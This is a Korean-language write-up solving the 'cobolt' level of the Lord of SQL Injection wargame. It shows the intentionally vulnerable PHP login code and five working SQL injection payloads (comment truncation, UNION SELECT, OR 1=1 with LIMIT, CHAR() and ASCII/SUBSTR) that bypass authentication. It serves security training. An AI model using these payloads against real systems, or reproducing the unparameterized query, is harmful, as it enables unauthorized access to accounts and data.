# Lord of SQL Injection No.2 - cobolt

## 문제 출제 의도

SQL Injection을 통해 원하는 값을 select하도록 조작할 수 있는지 확인한다.

## 소스 코드 분석

cobolt 문제의 php 소스 코드는 다음과 같다.
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```
-----

```php
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>";
```
* 받은 id와 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* 1번 문제와 거의 동일하며, 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 id에 "admin"이라는 값이 들어있음'이다.

-----

## Solution

1. admin 문자열 직접 삽입

    ```
    http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin'-- -
    ```
    ```sql
    select id from prob_cobolt where id='admin'-- -' and pw=md5('')
    ```

    이는 결국 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

2. UNION 구문 이용

    ```
    http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=' union select 'admin'-- -
    ```
    ```sql
    select id from prob_cobolt where id='' union select 'admin'-- -' and pw=md5('')
    ```

    이는 결국 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

3. LIMIT 구문 이용

    ```
    http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=' or 1=1-- -
    ```
    ```sql
    select id from prob_cobolt where id='' or 1=1-- -' and pw=md5('')
    ```

    이는 테이블의 모든 행을 불러오도록 조작하는 SQL Injection이다. 이를 수행하면 다음과 같은 문자열이 응답에 포함된다.

    ```
    Hello rubiya
    You are not admin :(
    ```
    이 문자열로 미루어 보아 테이블에 admin이라는 id를 가진 행이 있을 것임을 추측할 수 있다.

    또한 현재는 테이블의 rubiya라는 id를 가진 첫 번째 행이 들어가지만 $result['id']에 들어가는 행을 하나씩 당겨보는 것을 id가 admin인 행에 도달할 때까지 반복하면 문제가 풀릴 것임을 추측할 수 있다.

    ## LIMIT

    MySQL에는 SELECT절에 LIMIT이라는 구문을 이용하여 반환되는 행을 제한하는 기능이 있다.
    [MySQL Documentation](https://dev.mysql.com/doc/)에서 [SELECT절에 대한 문서](https://dev.mysql.com/doc/refman/5.7/en/select.html)를 찾아보면 다음과 같은 부분을 찾을 수 있다.
    
    ![limit](../images/limit.png)

    즉, SELECT 절의 마지막에 LIMIT 1,1 을 붙이면 테이블에서 조건에 맞는(WHERE 구문이 있으면) 행 중 첫 번째 행부터가 아닌 두 번째 행부터 하나의 행만 가져오게 된다.

    ```
    http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=' or 1=1 limit 1,1-- -
    ```
    ```sql
    select id from prob_cobolt where id='' or 1=1 limit 1,1-- -' and pw=md5('')
    ```

    즉 위 SQL Injection은 prob_cobolt 테이블의 2번째 행의 id가 admin이기 때문에 결국 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

4. CHAR() 함수 및 ASCII 코드 활용

    ```
    http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=' or id=char(97, 100, 109, 105, 110)-- -
    ```
    ```sql
    select id from prob_cobolt where id='' or id=char(97, 100, 109, 105, 110)-- -' and pw=md5('')
    ```

    이는 ASCII에서 10진수 표기를 문자 표기로 바꿔주는 MySQL 함수인 CHAR를 이용하여 id가 admin인 행을 찾아 선택하도록 만든다.
    
    ASCII에서, 'a'=97, 'd'=100, 'm'=109, 'i'=105, 'n'=110이다.
    
    따라서 이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

5. ASCII(), SUBSTR() 함수 및 ASCII 코드 활용

    ```
    http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=' or ascii(substr(id, 1, 1))=97-- -
    ```
    ```sql
    select id from prob_cobolt where id='' or ascii(substr(id, 1, 1))=97-- -' and pw=md5('')
    ```

    이는 ASCII에서 문자 표기자 10진수 표기로 바꿔주는 MySQL 함수인 ASCII를 이용하여 id가 a로 시작하는 행을 찾아 선택하도록 만든다.

    이번에는 운이 좋아 a로 시작하는 첫번째 행이 admin이었지만, 만약 안되면 1번째 글자가 a, 2번째 글자가 d, 3번째 글자가 m, 4번째 글자가 i, 5번째 글자가 n인 행을 찾도록 조작하면 된다.
    
    ASCII에서, 'a'=97이다.
    
    따라서 이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.